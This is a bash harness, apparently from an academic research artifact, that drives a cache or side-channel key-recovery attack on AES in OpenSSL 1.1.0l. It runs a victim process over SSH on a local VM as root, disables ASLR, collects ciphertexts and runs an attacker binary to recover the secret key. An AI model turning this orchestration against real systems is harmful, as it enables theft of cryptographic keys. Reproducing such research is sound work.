function run(){
local N_attack=$1
local KEYID=$2
local SAMPLE_N=$3
local NOCACHEw=$4

# Compile the attacker
cd attacker
make clean  > /dev/null 2>&1 ;
make SAMPLE_N=$SAMPLE_N NOCACHE=$NOCACHE  > /dev/null 2>&1 ;
cd ..

# Compile and run the victim.
taskset -c 8 ssh -p 2222 root@localhost " \
cd /root/rr-artifact/aes-attack/victim/; \
make N_attack=$N_attack NOCACHE=$NOCACHE > /dev/null 2>&1; \
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space > /dev/null 2>&1; \
echo 0 | tee /root/rr-artifact/aes-attack/victim/flag > /dev/null 2>&1; \
export LD_LIBRARY_PATH=/root/rr-artifact/openssl-1.1.0l/ > /dev/null 2>&1; 
nohup /root/rr-artifact/aes-attack/victim/victim -k $KEYID > /dev/null 2>&1 & \
/root/rr-artifact/aes-attack/victim/wait.sh > /dev/null 2>&1; \
cat /root/rr-artifact/aes-attack/victim/address" > ./gpas/address

# Get the resulting ciphertexts.
taskset -c 8 ssh -p 2222 root@localhost " \
cat /root/rr-artifact/aes-attack/victim/ciphertext_$KEYID; \
rm /root/rr-artifact/aes-attack/victim/ciphertext_$KEYID" > ./ciphertexts/ciphertext

# Run the attacker.
taskset -c 1 ./attacker/attacker \
	-n $N_attack

# Wait until the victim finishes.
taskset -c 8 ssh -p 2222 root@localhost "/root/rr-artifact/aes-attack/victim/block.sh > /dev/null 2>&1;"
}

json_data=$(cat ../config.json)
export CONFIG=$(echo "$json_data" | jq -r '."root-directory"')

N_attack=200000
KEYID=0

NOCACHE=0
SAMPLE_N=80
for arg in "$@"; do
    if [[ "$arg" == "nocache" ]]; then
        NOCACHE=1
		SAMPLE_N=180
    elif [[ "$arg" =~ ^keyid=([0-9]+)$ ]]; then
        KEYID="${BASH_REMATCH[1]}"
    fi
done

echo "Recovering the secret key $KEYID..."
run $N_attack $KEYID $SAMPLE_N $NOCACHE


